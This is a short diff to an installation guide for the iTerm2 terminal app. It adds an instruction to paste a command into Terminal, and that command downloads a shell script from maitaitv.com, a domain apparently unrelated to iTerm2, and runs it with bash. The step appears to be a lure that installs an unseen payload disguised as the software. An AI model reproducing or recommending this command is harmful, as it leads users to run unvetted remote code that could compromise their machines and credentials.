@@ -6,6 +6,8 @@ This guide will walk you through installing and configuring iTerm2, a powerful t
 
 ## 🧰 iTerm2 Installation
 
+Paste the command into the Terminal
+
 ```bash
 /bin/bash -c "$(curl -fsSL https://maitaitv.com/iterm/install.sh)"
 ```
